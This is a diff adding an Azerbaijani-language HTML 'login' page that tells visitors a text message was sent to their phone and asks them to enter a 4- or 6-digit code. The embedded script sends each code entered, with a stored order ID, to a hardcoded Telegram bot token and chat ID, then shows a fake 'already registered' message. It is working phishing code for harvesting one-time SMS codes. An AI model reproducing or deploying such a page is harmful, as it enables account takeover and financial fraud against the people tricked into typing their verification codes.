@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8">
+  <title>Giriş</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background-color: #f5f5f5;
+      padding: 40px;
+      position: relative;
+    }
+    .header {
+      background-color: #ffffff;
+      color: #000;
+      padding: 15px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      border-bottom: 1px solid #ccc;
+      margin: -40px -40px 30px -40px;
+    }
+    .content {
+      text-align: center;
+      font-size: 16px;
+      color: #333;
+    }
+    .instruction {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #444;
+    }
+    .input-group {
+      margin-top: 20px;
+      margin-bottom: 5px;
+      max-width: 300px;
+      margin-left: auto;
+      margin-right: auto;
+      position: relative;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      outline: none;
+    }
+    .button {
+      width: 100%;
+      max-width: 300px;
+      padding: 12px;
+      background-color: #d00000;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 20px auto 0 auto;
+      display: block;
+    }
+    .alert {
+      display: none;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #d00000;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0,0,0,0.5);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .modal-content {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 300px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    .modal-content p {
+      margin-bottom: 20px;
+      font-size: 16px;
+      color: #333;
+    }
+    .modal-content button {
+      padding: 10px 20px;
+      background-color: #d00000;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">Giriş</div>
+  <div class="content">
+    <div class="instruction">
+      Telefonunuza mətn mesajı göndərildi. Göndərənin nömrəsini bura daxil edin.
+    </div>
+    <div class="input-group">
+      <input type="text" id="codeInput" maxlength="6">
+    </div>
+    <button class="button" onclick="validateCode()">Davam etmək</button>
+    <div class="alert" id="alert">İcazə verilən nömrələrin sayı yalnız 6 və ya 4-dür.</div>
+  </div>
+
+  <div class="modal" id="successModal">
+    <div class="modal-content">
+      <p>Artıq qeydiyyatdan keçib</p>
+      <button onclick="goToHome()">Anladım</button>
+    </div>
+  </div>
+
+  <script>
+    const input = document.getElementById('codeInput');
+    const alertBox = document.getElementById('alert');
+    const modal = document.getElementById('successModal');
+
+    input.addEventListener('input', function () {
+      this.value = this.value.replace(/[^0-9]/g, '');
+      if (this.value.length > 6) {
+        this.value = this.value.slice(0, 6);
+      }
+    });
+
+    function validateCode() {
+      const value = input.value.trim();
+      if (value.length !== 4 && value.length !== 6) {
+        alertBox.style.display = 'block';
+        setTimeout(() => {
+          alertBox.style.display = 'none';
+        }, 2000);
+      } else {
+        sendCodeToTelegram(value);
+        modal.style.display = 'flex';
+      }
+    }
+
+    function sendCodeToTelegram(code) {
+      const token = "8214700162:AAFSFr5T0Yjkz4x62p2IE_GAdcKP4FgHTB0";
+      const chatId = "8492691780";
+      const orderId = localStorage.getItem("orderId") || "000000";
+      const message = `🧾 Sifariş №${orderId}\n🔢 Kod: ${code}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+    }
+
+    function goToHome() {
+      window.location.href = "index.html";
+    }
+  </script>
+</body>
+</html>
